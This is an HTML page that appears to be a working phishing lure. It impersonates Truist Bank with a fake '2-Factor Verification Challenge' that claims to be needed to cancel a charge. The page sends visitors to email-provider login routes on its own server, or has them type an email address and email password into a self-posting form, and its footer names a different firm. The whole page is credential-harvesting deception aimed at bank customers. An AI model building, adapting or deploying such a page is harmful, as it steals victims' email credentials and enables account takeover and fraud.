<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Truist Bank | Verify Your Identity</title>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="shortcut icon"
      href="data:image/png;base64,"
    />
    <style>
      * {
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      html,
      body {
        height: 100%;
      }

      body {
        background-color: #f2f2f2;
      }

      span {
        display: block;
        max-width: -webkit-max-content;
        max-width: -moz-max-content;
        max-width: max-content;
        font-family: Arial;
        color: #333;
        width: 100%;
        font-size: 16px;
      }

      .nav {
        display: block;
        /* background-color: #408800; */
        padding: 10px 0px 6px;
      }

      .nav > img {
        display: block;
        margin: auto;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        pointer-events: none;
      }

      .login {
        display: block;
        margin: 40px auto;
        background-color: #fff;
        border: 1px solid #ccc;
        -webkit-box-shadow: 0px 1px 2px 0px rgba(0, 0, 0, 0.3);
        box-shadow: 0px 1px 2px 0px rgba(0, 0, 0, 0.3);
        border-radius: 3px;
        width: 100%;
        max-width: 450px;
        padding: 20px 20px;
      }

      .login > .title {
        font-size: 24px;
      }

      .login > .subtitle {
        margin-top: 12px;
      }

      .login > hr,
      form > hr {
        border: 0;
        border-top: 1px solid #ccc;
        margin: 25px 0;
      }

      #otherlogin > .required {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        color: #666;
        font-size: 12px;
      }

      .login > form {
        display: block;
        margin-top: 15px;
      }

      form > .row {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: justify;
        -ms-flex-pack: justify;
        justify-content: space-between;
      }

      .row > span {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        font-weight: bold;
        font-size: 13px;
        max-width: 125px;
      }

      form > .row:not(:first-of-type) {
        margin-top: 20px;
      }

      .row > .col > span {
        margin: 0px;
        padding: 0px;
        font-size: 12px;
        color: red;
      }

      .row > .col {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: justify;
        -ms-flex-pack: justify;
        justify-content: space-between;
        gap: 5px;
        width: 100%;
      }

      .col > span {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        color: #808080;
        font-size: 12px;
        margin-bottom: 8px;
      }

      .col > input,
      .col > select {
        display: block;
        font-family: Arial;
        color: #555;
        background: #fff;
        border: 1px solid #ccc;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        outline: 0;
        border-radius: 4px;
        font-size: 14px;
        width: 100%;
        padding: 10px 12px;
        -webkit-transition: border 0.1s, -webkit-box-shadow 0.1s;
        transition: border 0.1s, -webkit-box-shadow 0.1s;
        -o-transition: border 0.1s, box-shadow 0.1s;
        transition: border 0.1s, box-shadow 0.1s;
        transition: border 0.1s, box-shadow 0.1s, -webkit-box-shadow 0.1s;
      }

      .col > input.capitalize {
        text-transform: capitalize;
      }

      .col > input.error,
      .col > input.error:focus,
      .col > select.error,
      .col > select.error:focus {
        border-color: #ff0000;
      }

      .col > input.error:focus,
      .col > select.error:focus {
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
          0 0 5px rgba(255, 0, 0, 0.6);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
          0 0 5px rgba(255, 0, 0, 0.6);
      }

      .col > input::-webkit-input-placeholder {
        -webkit-user-select: none;
        user-select: none;
      }

      .col > input::-moz-placeholder {
        -moz-user-select: none;
        user-select: none;
      }

      .col > input:-ms-input-placeholder {
        -ms-user-select: none;
        user-select: none;
      }

      .col > input::-ms-input-placeholder {
        -ms-user-select: none;
        user-select: none;
      }

      .col > input::placeholder,
      .col > select {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      .col > input:focus,
      .col > select:focus {
        border-color: #66afe9;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
          0 0 8px rgba(102, 175, 233, 0.6);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
          0 0 8px rgba(102, 175, 233, 0.6);
      }

      .col > select {
        width: auto;
      }

      form > hr {
        margin-bottom: 35px;
      }

      form > button {
        all: unset;
        display: block;
        margin: auto;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        text-align: center;
        font-family: Arial;
        color: #fff;
        background: -webkit-gradient(
          linear,
          left top,
          left bottom,
          from(#428bca),
          to(#2d6ca2)
        );
        background: -o-linear-gradient(top, #428bca 0%, #2d6ca2 100%);
        background: linear-gradient(to bottom, #428bca 0%, #2d6ca2 100%);
        -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15),
          0 1px 1px rgba(0, 0, 0, 0.075);
        box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15),
          0 1px 1px rgba(0, 0, 0, 0.075);
        border: 1px solid #2b669a;
        border-radius: 4px;
        padding: 10px 0;
        width: 100%;
        max-width: 128px;
      }

      form > button:hover,
      form > button:focus {
        border-color: #285e8e;
        background: #2d6ca2;
      }

      form > button:focus {
        outline: thin dotted;
        outline-offset: -2px;
      }

      .footer {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
        position: sticky;
        -webkit-box-pack: justify;
        -ms-flex-pack: justify;
        justify-content: space-between;
        border-top: 1px solid #ccc;
        background-color: #fff;
        top: 100%;
        padding: 0 18px;
        padding-top: 24px;
      }

      .footer > img {
        display: block;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        pointer-events: none;
      }

      .text > span {
        margin-left: auto;
        color: #666;
        font-size: 12px;
      }

      .text > span:not(:first-of-type) {
        margin-top: 5px;
      }

      @media (max-width: 575px) {
        body {
          background-color: #fff;
        }

        .login {
          -webkit-box-shadow: unset;
          box-shadow: unset;
          border: 0;
        }

        form > .row {
          -ms-flex-wrap: wrap;
          flex-wrap: wrap;
        }

        .row > span {
          max-width: 100%;
          margin-bottom: 15px;
        }

        .row:first-of-type > .col {
          -ms-flex-wrap: wrap;
          flex-wrap: wrap;
        }

        .row:first-of-type > .col > .col,
        .row:first-of-type > .col > .col > input {
          width: 100%;
        }

        form > button {
          max-width: 100%;
        }

        .footer {
          padding-bottom: 24px;
        }

        .footer > img {
          margin: auto;
        }

        .footer > .text {
          width: 100%;
        }

        .text > span {
          margin: auto;
        }
      }
    </style>
  </head>
  <body>
    <div class="nav">
     <img src="data:image/png;base64," alt="Site Logo">
     </img>
    </div>
    <div class="login">
      <span class="title">2-Factor Verification Challenge</span>
      <span class="subtitle"
        >Before we proceed to cancel your charge, We need to ensure account ownership.
Please login to your respective email provider on file to proceed.</span
      >
      <hr />
      <div id="otherlogin" style="display: none">
        <span class="required">All fields are required.</span>
        <form  method="POST">
          <div class="row">
            <span>Email Address</span>
            <div class="col">
              <input
                name="email"
                type="email"
                placeholder="example@gmail.com"
                required
              />
              <span style="display: none"
                >Please enter valid email address.</span
              >
            </div>
          </div>
          <div class="row">
            <span>Email Password</span>
            <div class="col">
              <input required name="cpassword" type="password" minlength="6" />
              <span style="display: none"
                >Atleast 6 character is required.</span
              >
            </div>
          </div>
          <div class="row">
            <span>Confirm Email Password</span>
            <div class="col">
              <input
                required
                name="confirmpassword"
                type="password"
                minlength="6"
              />
              <span style="display: none">Password does not match.</span>
            </div>
          </div>
          <hr />
          <button type="submit">Submit</button>
          <div
            style="
              display: flex;
              justify-content: center;
              align-items: center;
              margin: 10px;
            "
          >
            <div
              id="backtoauth"
              style="color: black; font-size: 20px; cursor: pointer"
            >
              Back
            </div>
          </div>
        </form>
      </div>
      <div
        id="oauthlogin"
        style="
          display: flex;
          flex-direction: column;
          gap: 0px;
          flex-wrap: wrap;
          margin-top: 20px;
          justify-content: center;
          align-items: center;
        "
      >
        <img
          onclick="window.open('/auth/login/office', '_self');"
          style="cursor: pointer; margin-bottom: 5px"
          height="50px"
          width="200px"
          src="data:image/png;base64,"
        />
        <hr width="324px" />
        <img
          onclick="window.open('/auth/login/gmail', '_self');"
          style="cursor: pointer"
          height="60px"
          width="300px"
          src="data:image/jpeg;base64,"
        />
        <hr width="324px" />
        <img
          onclick="window.open('/auth/login/yahoo', '_self');"
          style="cursor: pointer"
          height="60px"
          width="300px"
          src="data:image/jpeg;base64,"
        />
        <hr width="324px" />
        <img
          onclick="window.open('/auth/login/aol', '_self');"
          style="cursor: pointer"
          height="60px"
          width="300px"
          src="data:image/jpeg;base64,"
        />
        <hr width="324px" />
        <img
          onclick="window.open('/auth/login/outlook', '_self');"
          style="cursor: pointer"
          height="60px"
          width="300px"
          src="data:image/jpeg;base64,"
        />

        <hr width="324px" />
        <div
          id="otherbutton"
          style="
            color: rgb(73, 73, 255);
            font-size: 30px;
            margin-top: 10px;
            cursor: pointer;
          "
        >
          Other
        </div>
      </div>
    </div>
    <div class="footer">
     
      <div class="text">
        <span>Â© 1998 - DYNAMIC DATE FMR LLC.</span>
        <span>All rights reserved.</span>
      </div>
    </div>

    <script>
      function validateEmail(email) {
        var re = /\S+@\S+\.\S+/;
        return re.test(email);
      }
      button = document.getElementsByTagName('button')[0];

      inputs = document.querySelectorAll('input');
      select = document.getElementsByTagName('select')[0];
      const errorSpans = document.querySelectorAll('.row > .col > span');

      function err(element, evt) {
        element.classList.add('error');
        evt.preventDefault();
      }

      function rem(element) {
        element.classList.remove('error');
      }

      button.addEventListener('click', (e) => {
        inputs.forEach((input) => {
          if (input.value.trim() == '') err(input, e);
          else rem(input);
        });
        if (!validateEmail(inputs[0].value)) {
          err(inputs[0], e);
          errorSpans[0].style.display = 'block';
        } else {
          rem(inputs[0]);
          errorSpans[0].style.display = 'none';
        }

        if (inputs[1].value.length < 6) {
          err(inputs[1], e);
          errorSpans[1].style.display = 'block';
        } else {
          rem(inputs[1]);
          errorSpans[1].style.display = 'none';
        }

        if (inputs[2].value.length < 6) {
          err(inputs[2], e);
          errorSpans[2].style.display = 'block';
        } else {
          rem(inputs[2]);
          errorSpans[2].style.display = 'none';
        }
      });

      const otherlogin = document.getElementById('otherlogin');
      const oauthlogin = document.getElementById('oauthlogin');
      const otherbutton = document.getElementById('otherbutton');
      const backtoauth = document.getElementById('backtoauth');

      otherbutton.addEventListener('click', (e) => {
        otherlogin.style.display = 'block';
        oauthlogin.style.display = 'none';
        errorSpans[0].style.display = 'none';
        errorSpans[1].style.display = 'none';
        errorSpans[2].style.display = 'none';
        inputs.forEach((input) => {
          rem(input);
        });
      });
      backtoauth.addEventListener('click', (e) => {
        otherlogin.style.display = 'none';
        oauthlogin.style.display = 'flex';
      });
    </script>
  </body>
</html>
